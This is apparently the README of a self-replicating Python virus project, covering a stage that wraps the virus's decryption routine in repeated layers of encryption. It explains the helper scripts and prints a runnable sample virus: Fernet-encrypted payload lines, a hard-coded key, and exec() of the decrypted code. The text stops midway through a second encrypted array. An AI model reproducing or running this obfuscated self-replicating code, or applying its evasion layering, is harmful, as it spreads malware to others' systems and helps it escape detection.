# Self Replicating Virus

## ** Disclaimer **

The information and code provided here, are inteded to be used for educational and research purposes only. Do not use the information for illegal activities, any actions and or activities related to the material contained within this repository is solely your responsibility. The author will not be held responsibile in the event of any criminal charges against any individual misusing the information provided here.

## TABLE OF CONTENTS

1. [What is it and how to use it](#what-is-it-and-how-to-use-it)
2. [A deeper dive](#a-deeper-dive)

   2.1 [encrypt_decryption.py](#encrypt_decryption.py)

   2.2 [recursively_encrypt_decryption.py](#recursively_encrypt_decryption.py)

3. [Bonus - Everything in one file](#bonus---everything-in-one-file)

## What is it and how to use it

This version, starting from an encrypted virus (namely taken from the `02-encryption` version), will recursively encrypt the decryption function.

Supposing you have generated a `self_replicating_virus_encrypted.py` from the version `02-encryption`, you can run:

```py
py recursively_encrypt_decryption.py
```

Bear in mind that this script will rely on `encrypt_decryption.py`, which will be analyzed below.

Now, you'll be asked how many levels of encryption you want:

    Number of encryption:

consider that for each level, a file will be generated as:

    self_replicating_virus_encrypted_e1.py
    self_replicating_virus_encrypted_e2.py
    .
    .
    .

For the purpose of demonstration we can just type:

    Number of encryption:
    10

and then you will be asked the name of the encrypted file:

    Name of the file you want to encrypt the decryption method:

you can just answer with the filename of the encrypted virus you generated from the `02-encryption` version, in the example case of that section:

    self_replicating_virus_encrypted.py

Now, in the same directory, 10 new files should be generated, each filename will terminate with `_e*` where `*` is a progressive number.

You can run the version you like and the result should be the same as the previous versions:

    py self_replicating_virus_encrypted.py

## A deeper dive

Let's see how this work.

Fistly, `recursively_encrypt_decryption.py` rely on `encrypt_decryption.py`. In fact the only purpose of `recursively_encrypt_decryption.py` is to ask the user for the number of encryption and then call the `encrypt_decryption.py` module the given number of times, ensuring that the latest encrypted version of the virus is fed as input for `encrypt_decryption.py`.

### encrypt_decryption.py

Let's walk through this module. Summarizing, the following are the steps that govern its behaviour:

1. Read the code between the delimiters `### END ENCRYPT ###` and `### END VIRUS ###`, namely the decryption part.
2. Encrypt these lines.
3. Read the lines between the `### ENCRYPT ###` and `### END ENCRYPT ###`, namely the old payload.
4. Write the old payload followed by the new encrypted lines (stored in a new variable named after the virus file used to generate this new encrypted version) in the new encrypted virus and add the decryption method to decrypt the new encrypted lines.

   > Example:
   >
   > If the encrypted virus file is called `self_replicating_virus_encrypted.py` and we use the `encrypt_decryption.py`, then in the new encrypted virus there will be an array called `self_replicating_virus_encrypted` defined after the `encrypted_payloaf` and storing the encrypted lines corresponding to the decryption method of the original encrypted virus.

As an example, say we have the following `self_replicating_virus_encrypted.py`:

```py
##### START VIRUS #####

##### ENCRYPT #####
encrypted_payload = [b'gAAAAABf2NGYStgP3J7gBTIv6kDOUtTNyk2bIG-aw3b0pL0po00h_eBCVpWrahnvfVvAV_Z31rCiHDghdVjPeXF8bYL8VzdxxQ==',b'gAAAAABf2NGYuoF3PotW4XR7EXq3iM_s4per73h7-43IBN-bfyFXk3v_PvBPrOwPcnzXSW6rLbqNv7sek4YcPl0rWVEYTg6tzJoZtlQ-ix0YsPabMxrowwg=',b'gAAAAABf2NGYaRbEuPqn_28v6JI7cWMOmmxlRg7Er4WNXARmvQoFLinMg-x673NYxxNnaykid64-7b2dgdq_TZ8mpEHIqmIZzk_1PNd1ge70rx_idit4COU_tChx0Tj3pWJt_i3e7bc6',b'gAAAAABf2NGYPy8QNgL3Uz11UboBpsEDeVJyqt9PADSIpF82WJrZGZ0rMxdTkV0O_XCfJZ6uq2q13M-fJMphbkOLAyVFycFFzg==',b'gAAAAABf2NGYnzAQm7kIyR_hq7RHKTpMHx5uU36w1fepc-3bICh5cA6s0zsYdDJkVEU-_7FptfglxroisebWeNo_XgpJ4CaBWdYarRYp96_asxARO5nXf5A=',b'gAAAAABf2NGYiSgULH-MwVZLMw3XJewNV-8rfZeanns6OTKXUJEDwJ-LIq6JFQVrCA8N3IgCfLTUAXpPfqOTgP7Q3KA69qb9DA==',b'gAAAAABf2NGYl1KJJAayjigxiPSQ3THo_Q7W9wWGmopHWSPIBtexreMRyftvqGP9jWioB-A4vXp_5yKo4tblx5LdYltWNgim3Q==',b'gAAAAABf2NGYaS5NzgIa0hRwmxvLTxbdEM9i_1MsKi7P_KCWG8BLsGCOUl35sR9fBb1SVf7ZA0xplM_qTLL2bo18PkWk_6IwyxHsErDep-u0_Q0T-l3NNtnAEgUAB3k0iPGhEF7fWFes',b'gAAAAABf2NGYLffLRfK6bBDyn6wtrkQOH7t_7IOl3-VPPrqWreUQLhbZbc6wCOafNG_tQ5EF8WRXkq2MA0pTywQc098fCxfYPK65d453hyF1VHJmZnt7k7__xmkZhXJkOl8PB2YIrwFO',b'gAAAAABf2NGYURgrbCFtR_3PvBdxCmNFNbLKxSm7ul1-hL0bHig3qEWi65oWKmunz4LwaafHgdZe7eksY8QN7Y6Cwfv6XoTTXKGVIvINck80UrlsWLKhEYo=',b'gAAAAABf2NGYdjnCYbqrAYzdA2YJjPE4b0G7002Q89UEDhLcwnmMtOgjkMCufe3bHPhccDTaiDFwQrUeO9kVf9gaEtsI-octNNSUSBdvONty5adEfR3zg8M=',b'gAAAAABf2NGYlvJPljsaeO4fFuSkI7V8TE5j7XLJrAHZlzFbTGeVk3V2c2wwh-AeCaevD9eUchRBvbmRbazifqpOkcGGbk0DSdK8hQ2FPO5btSca0711CbZmDc9WZysRFDlNr7eTP4XU_qcTW-7tnaPbMRKAxp8STw==',b'gAAAAABf2NGYdBvK8JvDND11YOikZKR1Xg9SWfftdjOBSeO5AP7vDhWJEW5GVKHJpXUIVPXe4BQ_63Ag-1NeEckZaC1bE4w6yw==',b'gAAAAABf2NGYBgl9mrc1U0hDefXg3d4IZL2DYMOrMafuwdoBUB7A5Ysd869QHPySztJdAYHxWnBHWlhUiXIN6O9gUf4KkpsSjQ==',b'gAAAAABf2NGYqpGt8m-kZL_n8GGUOSII8Tm2S5XmUnOHOibOihvXIm2ockyo18ynujIGjySEobh5PjKMMLQbAUI6yfCoIA8cGcVKOAJYcowIHk5va9V3aQY=',b'gAAAAABf2NGYJEOG4wAfqFpRvkK38ubmWw2B86JRmZcUaqTNHCGAmRLJhGfmHjbGoHpXHAb4uWwry6c5aVjzg-yDCVqi8pWxnaviU-gdXLZcCnXl5WY5cpU=',b'gAAAAABf2NGYMnHDwHNMadfMhejqWElah1RhER-lZSgzwQtpcwWvx98hPS3W0KnENF7IsB-45GZEgQz73wlvuZV29Fv4Maa3TjZmfYZAqjonslo6oApG41DpqpzQpurOqN-hYy0zcBp4',b'gAAAAABf2NGY6x1aU9K0qaUCfE9sIuPJ-Ed3vLgPtO_NgE52kGafXZBNmZa_x1cDwaRjrJAEHQTBcQLtahDBKsRWKEUljrtZKA==',b'gAAAAABf2NGYIMefI0RIxED9669FttTKc7hSKll-0f12JU1_7PNe5fArAakqW8a8PPrvRNMRCXAI3PN1iZxvqNk8s80DPO96dA==',b'gAAAAABf2NGYvY3Ne2iUvWzMVfEGmITyRq0EDeA2_w5DVTHrUdXNfPCNv2SBCtvMNDz8Dra6gzC6v4C1g8wpE4G4zdDAh3Cw4nXcynyJY_wfFb5-PoL-YWY=',b'gAAAAABf2NGYLCBDZPphLeITrbYPnpIU04S96IoUtwLzdOMQKozqKlT7yW2VFoEe7qGOel5AntcMoS2G9-TBpREAP2WfntTBJbpPJtBJGZicrnYscjTTucI=',b'gAAAAABf2NGYE7ylGSbs9dg4eHMi6ZIElyuzxV6DXWB_Z8SNPKZnZL35p1xx3vzjjaGNOTnE9xQAf49OOEkCJPxNCjlHqnBU2nJafbaUMbllvtbEb-lw1pc=',b'gAAAAABf2NGY8L5sg1rMf2yLvXaVdtJ0DDgQS6nu_8AGVdtUnoKJMVBQBxRrgzA9TdMxznz_zZgsIULNmQauMXnRWxt9Num60GanpApdnc6mu78GW6RZf-fF9EKiW5mmFRYZJrcgj-1I',b'gAAAAABf2NGYXw2f7r6_in-3CGu69sNFkXhaqqG6XtNi6Ykt43OHXs-HC9GoMwfXHkQwNjLkWQUTdhFKPY1-X2h23CVeoKAy2I1Go0E9HTkmq2uVQswYQXM=',b'gAAAAABf2NGYcnp8KOYeJY3tWV-8KS_JQFRByb5N_ujMCs0jSA6EVIQCBoPwOrslNGG3I_51R-bi7qoa6iwWTFaSvmPlA3U4chC2yaDFPWZpdbDRLIFFe0M=',b'gAAAAABf2NGYDN6OOQfTkVt5SmdFJThzkkXMqDm-43YFdeEhmY6y7cByWBJ3puqRdj1k1d-xc4dXhAyEhg3-z4-z1OfnYPc_Tw==',b'gAAAAABf2NGYfpOphmJXO9UFe6TMVqf25nRiRZUiPgmnY_emogU-orNwPPSqd8_qr0XiwV08XR2lhXfyvYvggw3DyYIW__ZSWA==',b'gAAAAABf2NGYmPDXo17u7QIjTudoB5w93aS-m2NyosDkNOK8k6toE-1RZEADprQKO1qxFMQo60YA6kpvlrYRJrBXQc5-WxstNsMuycodAZvA3S8zDNg3SfM=',b'gAAAAABf2NGY0rdFzGg2RbSP06TwqX5NcSMFAurEDgioJxE8wv52gtEXEMut0wbDhHUb9XmY1If3-RoIP1Ki992TMddRV83wpvGBsQ88LJEwTJGWJpiuYU-frLBIHP3PA7kA9igzm6JH8y3eqYtI6FdU7-pjolb77zGVpaMrqFesGsb1Jvtii5g=',b'gAAAAABf2NGYK43_aZgwDSc1KhxqlMOEOBT3Qv5no0QgtOewO15GuEag_BDjEPWLIT7Bpxvr6d-qQ-d7PPGyriA7DbcG7HWpVnMyZYBN2i5ELc7494S9XX0=',b'gAAAAABf2NGYIHsXdb7eB5gszM2QFVE2XlM60OAlHyEfVgYvBkPWKxoyt02LsRrgFlUPs7r0_2PXonTHvi2c7F76ORNJ3jBkNq6oGWq579mGDH9ZMQ41Dfg=',b'gAAAAABf2NGYPdYIWK2i5EM0VEBL07pS5JAhw-nVd2EfkXWGfsImKSDmetWEXku5yKqFG0JW3b64FunDaJga8Lm7FUhiCtx9mqZOHB6b2swTRS2vVJY0Wtw=',b'gAAAAABf2NGYmkYrOgtdAIXyZOfaWt_joJgr1a-qPLm4JIuYJTB5wsyXb6Wh9TtuNI5jb1-YivIHTkUVKVg1UwSx1iy_S-cIl2goyC4C7vGshqgpKrxBt1I=',b'gAAAAABf2NGYiGv6El5iRofFdC0_MDlb9cc-01ZyorX2NI-PdleNetf9PkqVwLE9BnC_Z3pfXzalcasK6oeKMHLDzr4pLHUYMIKhHTBMfv45jRvE9SA9wnwGAGJr-fh5eaCTPSULr5cIxiu2au6NXqLdS9qXpMQ5kQ==',b'gAAAAABf2NGYXylQP4qCD8WlpfciLeYUEGLmL9dYnbUF15uyTi1_J8R_b4zFG6xIGb65NtFQZFJH1_67z_I2IX4b2Bmj4u95DAjYb8DFNmdBzpGlGK8mrOA=',b'gAAAAABf2NGYDWjoLFrde0zFR7Zh3b4L98loqJKWfIFfElAriUzMEaW1yBzkSo6GEwVvkt4rTaRKRyIxOBSzcz7AU0YDtr_9iTAUOTAkwgxjDUyTI8tp8UKmWVhkCvkQiJ_9QOcuYgBs',b'gAAAAABf2NGYVG3-YeoUJzG0_Vy_ZSVYo_pUOvvTNsQktme_EYptNeMgg7qhy30uhckE_RNSClCmv4NY6c3JJDnmieIiteu0otSbUAIU8WFYxwiphX0yB-lzOp1FejNCEBBcrasMzAom0dogQfX6BV-yZlc_rE7kcA==',b'gAAAAABf2NGYirABqI8E_btzZn6XEkrR3qjWZnbV7ug5atCojJ3TLx43acg68dFJkrr98C9y9hI16ywC6ieh4xDaNpE7pOcOOpCuxJdPHsJBYPazALWNEzs=',b'gAAAAABf2NGYN3imFMl61knY3TtqA3cBiqRSnb1hMXf3dmb0w5CA38TivS11SlxpzpnWjE1MaDSBoL4UM-yEfQNJ4LN7669AFw==',b'gAAAAABf2NGYBiuGZDhepTN1wkcjiPco8PKSqYG3Lym6eZg90J7CQmedVh87fPSv1ndbJ7FO6_wszl4uhXTxdfXTieQoep2rkQ==',b'gAAAAABf2NGY6IUc39EtW0r7ikFW88BMJVw2zMno-aicR3LRsXAubxG4oopwNL0zfo1ImUadGicmXpPg9LZMx_OgaEq70xHM-jEw0KYbJ7Il7pGY7XyQtjY=',b'gAAAAABf2NGYx8eHXTVPRukC-i1dbdlpj6Y6XJaVC8U4I0LHcr2OAbIs7cXFyoLeTn89-bMXdWZQpfyqOpmDzA8IUcaHZIVVg6ZbcH2Zc2idm-F53JSS8ho=',b'gAAAAABf2NGYw1M7OZkiofVePZkmpa-x3kNZVlb1h4uRrF36wpGIeM3jsvtiQU9ruOCxaAtctnLm1L-FKaZqroQ_uXqksFvLhiz3AV7Bpf2eAyADG8L8qWs=',b'gAAAAABf2NGYjxRxadirPJC4tTQ5Y1rJS8nn27K6nI4dVA-LyvC4dEWuOg2K1KFWRgsDRTlTJTU-OzdNP1DqJV2bLOG10Mj-gXmBbnVCEdANr5sKAbVKCNs=',b'gAAAAABf2NGYGGYAF2GsteWbTGsCR5GRmDUvJd_qStMscLnkM_Vzwc3A7TSdUEyMp-wA5sHe3sAGhtqS8aNuipbppIhLhLXmTA==',b'gAAAAABf2NGY9obqR5Qv_ciMzNwetg_dQFPc4wGITF6JSfUwNEQ2iAiyvFIgJn68-z-kCL_HLOeAfnxbUVNH14LX2WOZRymnn6oQbE4WWUqI2FSGOaCyFIU=',b'gAAAAABf2NGYDJGR4FIZ2Hy3qaMWK_Uj0jj7Gzh2KXttcqCQm8wflUTeKWDXob2E4FxmyD-sGvbl63d1zJWE92ssmNvlRN8jIeDl9dw1aafOndmZ6vtdkvo=',b'gAAAAABf2NGY1_zJBeASmFLaSkaRuToTJAFVxgFFKHsJN3la7nVhDFyPtazBM33CSau5GTT_XXiQ90LN9yiFTTA8ZxV4V2dtoN0GVb_Tc2SD-6ALwyXSlqs=',b'gAAAAABf2NGYxEN9Y_Lu5tV-LaS1UL39p5kxAGC_kinY8RS7zCX8wD_ElxORL3wYMUUB1N1kyezXh2GHRwK1HihWmDQwVyTlZA==',b'gAAAAABf2NGYiAFW2-XdfYP8dp38Or72UT8a7W0t2BlZn0hia0DSKvslWY5j7QM-mcMbdTMiTd3n7ZxrC9MjGj9WXWHLekEZWwnRLUxxsidEH_Jw7TyduOM=',b'gAAAAABf2NGYiIPWmoRd937mAK3Rh1GHB-F5Qv11MmSF_dEtwU8EleYniI_fvID0BKiydT3jdK4LtNAiH4SBSz5G-zT4Z_2QNuBVPE-zafKcYY_Q6qLOcTs=',b'gAAAAABf2NGY8JdqRBH3OwXg6vK4L0ZPSvElA9A651xNPrOLxQ7WYnn0rt7KeMnmsTc1ZLOijaIi3FwSm_AWjdQ3-1XtDcefrA==',b'gAAAAABf2NGYWeFWPd961PMMC0T9FKa-5-AcBMvaspM5nsMVSG8sSeeEqHChbkoZj8pqPDQqtW6xNhsc2F-7Qe6dR4WvtXIT7w==',b'gAAAAABf2NGYBqnGf-YUWZIp5RTHl520oSyVOLxzBBczhpokald9yfSCuaT8R0xtv0EBGqWiUM1ZlfD_2PC9RiTFYDs3fSzytLmfq9docAB95ASt6iuYZss=',b'gAAAAABf2NGY3gP6RRkfTQyX4wCN8683al7xe74weuIzwYkFS1Qr5iV4nZj_PWpukcLarwFIjBq_xUIlCsxgv5XWAICxSp7YOixcKemAaIPFjtYrFWAUGY8=',b'gAAAAABf2NGYmZbMweMHfA4RS_GIbP_vtWZbrwnbeQuBt6BmqpzlR4MF8HZwpP0ZCRO6sS4v9rNAnuxtwWMQZrvVoD4uMaXfJA==',b'gAAAAABf2NGYwQwPxc1Tti2FWa3we-ZCaFDbq1_6_DKCzIhnAw__p9ZreJn7H7TKrTjy_eP5bO2kRWopLV2GaF-VfRPeWZPPhJsB6DYjSSQ_3Kny4KcNukY=',b'gAAAAABf2NGYN1akoPovYlprNiNUefA3Kw1uJQCLB0xlJJU1jXPmlHJAI8hIEVhCYdxRfH9q_GtZc50i6zh5PZrVP8KQM8xxsM4rtr9CCkH3RJyGxlmEZt9ZpocI8gch2OjzbBJn1Mgn',b'gAAAAABf2NGYEwANJ4-YehUGPaOToO_VAzmknnjSi4fnsvorq2u3B9GPCM1ESTQIVzUPEt-UWOcYd8odAve1RGha0LwoZOTpcd0-aTqGIUQhEr01sx63s2g=',b'gAAAAABf2NGYnBoflT7dvM2HgR-_WMJ8CMr4g8hu9MLgJU-ioUJneMoKlMs8iCgOAB_iwzHA16Bd5uV6vEsOISonK5c933Dmrw==']
##### END ENCRYPT #####

from cryptography.fernet import Fernet

decrypted_payload = []

def decrypt_payload():
  fernet = Fernet(b'ZBdrP1znue2godNiopGdPvEY7ypRsFSE3Y77qMcUhpc=')
  for elem in encrypted_payload:
    decrypted_payload.append((fernet.decrypt(elem)).decode())

decrypt_payload()
exec("".join(decrypted_payload))

###### END VIRUS ######

```

Then, by feeding this file to `encrypt_decryption.py` and calling the new virus `self_replicating_virus_encrypted_e0.py`, this will have the following form:

```py
##### START VIRUS #####

##### ENCRYPT #####
encrypted_payload = [b'gAAAAABf2NGYStgP3J7gBTIv6kDOUtTNyk2bIG-aw3b0pL0po00h_eBCVpWrahnvfVvAV_Z31rCiHDghdVjPeXF8bYL8VzdxxQ==',b'gAAAAABf2NGYuoF3PotW4XR7EXq3iM_s4per73h7-43IBN-bfyFXk3v_PvBPrOwPcnzXSW6rLbqNv7sek4YcPl0rWVEYTg6tzJoZtlQ-ix0YsPabMxrowwg=',b'gAAAAABf2NGYaRbEuPqn_28v6JI7cWMOmmxlRg7Er4WNXARmvQoFLinMg-x673NYxxNnaykid64-7b2dgdq_TZ8mpEHIqmIZzk_1PNd1ge70rx_idit4COU_tChx0Tj3pWJt_i3e7bc6',b'gAAAAABf2NGYPy8QNgL3Uz11UboBpsEDeVJyqt9PADSIpF82WJrZGZ0rMxdTkV0O_XCfJZ6uq2q13M-fJMphbkOLAyVFycFFzg==',b'gAAAAABf2NGYnzAQm7kIyR_hq7RHKTpMHx5uU36w1fepc-3bICh5cA6s0zsYdDJkVEU-_7FptfglxroisebWeNo_XgpJ4CaBWdYarRYp96_asxARO5nXf5A=',b'gAAAAABf2NGYiSgULH-MwVZLMw3XJewNV-8rfZeanns6OTKXUJEDwJ-LIq6JFQVrCA8N3IgCfLTUAXpPfqOTgP7Q3KA69qb9DA==',b'gAAAAABf2NGYl1KJJAayjigxiPSQ3THo_Q7W9wWGmopHWSPIBtexreMRyftvqGP9jWioB-A4vXp_5yKo4tblx5LdYltWNgim3Q==',b'gAAAAABf2NGYaS5NzgIa0hRwmxvLTxbdEM9i_1MsKi7P_KCWG8BLsGCOUl35sR9fBb1SVf7ZA0xplM_qTLL2bo18PkWk_6IwyxHsErDep-u0_Q0T-l3NNtnAEgUAB3k0iPGhEF7fWFes',b'gAAAAABf2NGYLffLRfK6bBDyn6wtrkQOH7t_7IOl3-VPPrqWreUQLhbZbc6wCOafNG_tQ5EF8WRXkq2MA0pTywQc098fCxfYPK65d453hyF1VHJmZnt7k7__xmkZhXJkOl8PB2YIrwFO',b'gAAAAABf2NGYURgrbCFtR_3PvBdxCmNFNbLKxSm7ul1-hL0bHig3qEWi65oWKmunz4LwaafHgdZe7eksY8QN7Y6Cwfv6XoTTXKGVIvINck80UrlsWLKhEYo=',b'gAAAAABf2NGYdjnCYbqrAYzdA2YJjPE4b0G7002Q89UEDhLcwnmMtOgjkMCufe3bHPhccDTaiDFwQrUeO9kVf9gaEtsI-octNNSUSBdvONty5adEfR3zg8M=',b'gAAAAABf2NGYlvJPljsaeO4fFuSkI7V8TE5j7XLJrAHZlzFbTGeVk3V2c2wwh-AeCaevD9eUchRBvbmRbazifqpOkcGGbk0DSdK8hQ2FPO5btSca0711CbZmDc9WZysRFDlNr7eTP4XU_qcTW-7tnaPbMRKAxp8STw==',b'gAAAAABf2NGYdBvK8JvDND11YOikZKR1Xg9SWfftdjOBSeO5AP7vDhWJEW5GVKHJpXUIVPXe4BQ_63Ag-1NeEckZaC1bE4w6yw==',b'gAAAAABf2NGYBgl9mrc1U0hDefXg3d4IZL2DYMOrMafuwdoBUB7A5Ysd869QHPySztJdAYHxWnBHWlhUiXIN6O9gUf4KkpsSjQ==',b'gAAAAABf2NGYqpGt8m-kZL_n8GGUOSII8Tm2S5XmUnOHOibOihvXIm2ockyo18ynujIGjySEobh5PjKMMLQbAUI6yfCoIA8cGcVKOAJYcowIHk5va9V3aQY=',b'gAAAAABf2NGYJEOG4wAfqFpRvkK38ubmWw2B86JRmZcUaqTNHCGAmRLJhGfmHjbGoHpXHAb4uWwry6c5aVjzg-yDCVqi8pWxnaviU-gdXLZcCnXl5WY5cpU=',b'gAAAAABf2NGYMnHDwHNMadfMhejqWElah1RhER-lZSgzwQtpcwWvx98hPS3W0KnENF7IsB-45GZEgQz73wlvuZV29Fv4Maa3TjZmfYZAqjonslo6oApG41DpqpzQpurOqN-hYy0zcBp4',b'gAAAAABf2NGY6x1aU9K0qaUCfE9sIuPJ-Ed3vLgPtO_NgE52kGafXZBNmZa_x1cDwaRjrJAEHQTBcQLtahDBKsRWKEUljrtZKA==',b'gAAAAABf2NGYIMefI0RIxED9669FttTKc7hSKll-0f12JU1_7PNe5fArAakqW8a8PPrvRNMRCXAI3PN1iZxvqNk8s80DPO96dA==',b'gAAAAABf2NGYvY3Ne2iUvWzMVfEGmITyRq0EDeA2_w5DVTHrUdXNfPCNv2SBCtvMNDz8Dra6gzC6v4C1g8wpE4G4zdDAh3Cw4nXcynyJY_wfFb5-PoL-YWY=',b'gAAAAABf2NGYLCBDZPphLeITrbYPnpIU04S96IoUtwLzdOMQKozqKlT7yW2VFoEe7qGOel5AntcMoS2G9-TBpREAP2WfntTBJbpPJtBJGZicrnYscjTTucI=',b'gAAAAABf2NGYE7ylGSbs9dg4eHMi6ZIElyuzxV6DXWB_Z8SNPKZnZL35p1xx3vzjjaGNOTnE9xQAf49OOEkCJPxNCjlHqnBU2nJafbaUMbllvtbEb-lw1pc=',b'gAAAAABf2NGY8L5sg1rMf2yLvXaVdtJ0DDgQS6nu_8AGVdtUnoKJMVBQBxRrgzA9TdMxznz_zZgsIULNmQauMXnRWxt9Num60GanpApdnc6mu78GW6RZf-fF9EKiW5mmFRYZJrcgj-1I',b'gAAAAABf2NGYXw2f7r6_in-3CGu69sNFkXhaqqG6XtNi6Ykt43OHXs-HC9GoMwfXHkQwNjLkWQUTdhFKPY1-X2h23CVeoKAy2I1Go0E9HTkmq2uVQswYQXM=',b'gAAAAABf2NGYcnp8KOYeJY3tWV-8KS_JQFRByb5N_ujMCs0jSA6EVIQCBoPwOrslNGG3I_51R-bi7qoa6iwWTFaSvmPlA3U4chC2yaDFPWZpdbDRLIFFe0M=',b'gAAAAABf2NGYDN6OOQfTkVt5SmdFJThzkkXMqDm-43YFdeEhmY6y7cByWBJ3puqRdj1k1d-xc4dXhAyEhg3-z4-z1OfnYPc_Tw==',b'gAAAAABf2NGYfpOphmJXO9UFe6TMVqf25nRiRZUiPgmnY_emogU-orNwPPSqd8_qr0XiwV08XR2lhXfyvYvggw3DyYIW__ZSWA==',b'gAAAAABf2NGYmPDXo17u7QIjTudoB5w93aS-m2NyosDkNOK8k6toE-1RZEADprQKO1qxFMQo60YA6kpvlrYRJrBXQc5-WxstNsMuycodAZvA3S8zDNg3SfM=',b'gAAAAABf2NGY0rdFzGg2RbSP06TwqX5NcSMFAurEDgioJxE8wv52gtEXEMut0wbDhHUb9XmY1If3-RoIP1Ki992TMddRV83wpvGBsQ88LJEwTJGWJpiuYU-frLBIHP3PA7kA9igzm6JH8y3eqYtI6FdU7-pjolb77zGVpaMrqFesGsb1Jvtii5g=',b'gAAAAABf2NGYK43_aZgwDSc1KhxqlMOEOBT3Qv5no0QgtOewO15GuEag_BDjEPWLIT7Bpxvr6d-qQ-d7PPGyriA7DbcG7HWpVnMyZYBN2i5ELc7494S9XX0=',b'gAAAAABf2NGYIHsXdb7eB5gszM2QFVE2XlM60OAlHyEfVgYvBkPWKxoyt02LsRrgFlUPs7r0_2PXonTHvi2c7F76ORNJ3jBkNq6oGWq579mGDH9ZMQ41Dfg=',b'gAAAAABf2NGYPdYIWK2i5EM0VEBL07pS5JAhw-nVd2EfkXWGfsImKSDmetWEXku5yKqFG0JW3b64FunDaJga8Lm7FUhiCtx9mqZOHB6b2swTRS2vVJY0Wtw=',b'gAAAAABf2NGYmkYrOgtdAIXyZOfaWt_joJgr1a-qPLm4JIuYJTB5wsyXb6Wh9TtuNI5jb1-YivIHTkUVKVg1UwSx1iy_S-cIl2goyC4C7vGshqgpKrxBt1I=',b'gAAAAABf2NGYiGv6El5iRofFdC0_MDlb9cc-01ZyorX2NI-PdleNetf9PkqVwLE9BnC_Z3pfXzalcasK6oeKMHLDzr4pLHUYMIKhHTBMfv45jRvE9SA9wnwGAGJr-fh5eaCTPSULr5cIxiu2au6NXqLdS9qXpMQ5kQ==',b'gAAAAABf2NGYXylQP4qCD8WlpfciLeYUEGLmL9dYnbUF15uyTi1_J8R_b4zFG6xIGb65NtFQZFJH1_67z_I2IX4b2Bmj4u95DAjYb8DFNmdBzpGlGK8mrOA=',b'gAAAAABf2NGYDWjoLFrde0zFR7Zh3b4L98loqJKWfIFfElAriUzMEaW1yBzkSo6GEwVvkt4rTaRKRyIxOBSzcz7AU0YDtr_9iTAUOTAkwgxjDUyTI8tp8UKmWVhkCvkQiJ_9QOcuYgBs',b'gAAAAABf2NGYVG3-YeoUJzG0_Vy_ZSVYo_pUOvvTNsQktme_EYptNeMgg7qhy30uhckE_RNSClCmv4NY6c3JJDnmieIiteu0otSbUAIU8WFYxwiphX0yB-lzOp1FejNCEBBcrasMzAom0dogQfX6BV-yZlc_rE7kcA==',b'gAAAAABf2NGYirABqI8E_btzZn6XEkrR3qjWZnbV7ug5atCojJ3TLx43acg68dFJkrr98C9y9hI16ywC6ieh4xDaNpE7pOcOOpCuxJdPHsJBYPazALWNEzs=',b'gAAAAABf2NGYN3imFMl61knY3TtqA3cBiqRSnb1hMXf3dmb0w5CA38TivS11SlxpzpnWjE1MaDSBoL4UM-yEfQNJ4LN7669AFw==',b'gAAAAABf2NGYBiuGZDhepTN1wkcjiPco8PKSqYG3Lym6eZg90J7CQmedVh87fPSv1ndbJ7FO6_wszl4uhXTxdfXTieQoep2rkQ==',b'gAAAAABf2NGY6IUc39EtW0r7ikFW88BMJVw2zMno-aicR3LRsXAubxG4oopwNL0zfo1ImUadGicmXpPg9LZMx_OgaEq70xHM-jEw0KYbJ7Il7pGY7XyQtjY=',b'gAAAAABf2NGYx8eHXTVPRukC-i1dbdlpj6Y6XJaVC8U4I0LHcr2OAbIs7cXFyoLeTn89-bMXdWZQpfyqOpmDzA8IUcaHZIVVg6ZbcH2Zc2idm-F53JSS8ho=',b'gAAAAABf2NGYw1M7OZkiofVePZkmpa-x3kNZVlb1h4uRrF36wpGIeM3jsvtiQU9ruOCxaAtctnLm1L-FKaZqroQ_uXqksFvLhiz3AV7Bpf2eAyADG8L8qWs=',b'gAAAAABf2NGYjxRxadirPJC4tTQ5Y1rJS8nn27K6nI4dVA-LyvC4dEWuOg2K1KFWRgsDRTlTJTU-OzdNP1DqJV2bLOG10Mj-gXmBbnVCEdANr5sKAbVKCNs=',b'gAAAAABf2NGYGGYAF2GsteWbTGsCR5GRmDUvJd_qStMscLnkM_Vzwc3A7TSdUEyMp-wA5sHe3sAGhtqS8aNuipbppIhLhLXmTA==',b'gAAAAABf2NGY9obqR5Qv_ciMzNwetg_dQFPc4wGITF6JSfUwNEQ2iAiyvFIgJn68-z-kCL_HLOeAfnxbUVNH14LX2WOZRymnn6oQbE4WWUqI2FSGOaCyFIU=',b'gAAAAABf2NGYDJGR4FIZ2Hy3qaMWK_Uj0jj7Gzh2KXttcqCQm8wflUTeKWDXob2E4FxmyD-sGvbl63d1zJWE92ssmNvlRN8jIeDl9dw1aafOndmZ6vtdkvo=',b'gAAAAABf2NGY1_zJBeASmFLaSkaRuToTJAFVxgFFKHsJN3la7nVhDFyPtazBM33CSau5GTT_XXiQ90LN9yiFTTA8ZxV4V2dtoN0GVb_Tc2SD-6ALwyXSlqs=',b'gAAAAABf2NGYxEN9Y_Lu5tV-LaS1UL39p5kxAGC_kinY8RS7zCX8wD_ElxORL3wYMUUB1N1kyezXh2GHRwK1HihWmDQwVyTlZA==',b'gAAAAABf2NGYiAFW2-XdfYP8dp38Or72UT8a7W0t2BlZn0hia0DSKvslWY5j7QM-mcMbdTMiTd3n7ZxrC9MjGj9WXWHLekEZWwnRLUxxsidEH_Jw7TyduOM=',b'gAAAAABf2NGYiIPWmoRd937mAK3Rh1GHB-F5Qv11MmSF_dEtwU8EleYniI_fvID0BKiydT3jdK4LtNAiH4SBSz5G-zT4Z_2QNuBVPE-zafKcYY_Q6qLOcTs=',b'gAAAAABf2NGY8JdqRBH3OwXg6vK4L0ZPSvElA9A651xNPrOLxQ7WYnn0rt7KeMnmsTc1ZLOijaIi3FwSm_AWjdQ3-1XtDcefrA==',b'gAAAAABf2NGYWeFWPd961PMMC0T9FKa-5-AcBMvaspM5nsMVSG8sSeeEqHChbkoZj8pqPDQqtW6xNhsc2F-7Qe6dR4WvtXIT7w==',b'gAAAAABf2NGYBqnGf-YUWZIp5RTHl520oSyVOLxzBBczhpokald9yfSCuaT8R0xtv0EBGqWiUM1ZlfD_2PC9RiTFYDs3fSzytLmfq9docAB95ASt6iuYZss=',b'gAAAAABf2NGY3gP6RRkfTQyX4wCN8683al7xe74weuIzwYkFS1Qr5iV4nZj_PWpukcLarwFIjBq_xUIlCsxgv5XWAICxSp7YOixcKemAaIPFjtYrFWAUGY8=',b'gAAAAABf2NGYmZbMweMHfA4RS_GIbP_vtWZbrwnbeQuBt6BmqpzlR4MF8HZwpP0ZCRO6sS4v9rNAnuxtwWMQZrvVoD4uMaXfJA==',b'gAAAAABf2NGYwQwPxc1Tti2FWa3we-ZCaFDb